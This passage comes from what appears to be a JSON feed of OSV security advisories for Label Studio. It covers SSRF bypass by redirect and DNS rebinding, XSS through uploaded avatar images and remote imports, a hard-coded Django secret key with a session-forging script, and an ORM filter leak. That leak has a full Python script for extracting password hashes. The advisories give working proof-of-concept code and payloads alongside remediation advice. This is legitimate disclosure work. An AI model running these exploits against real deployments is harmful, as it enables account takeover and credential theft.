defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  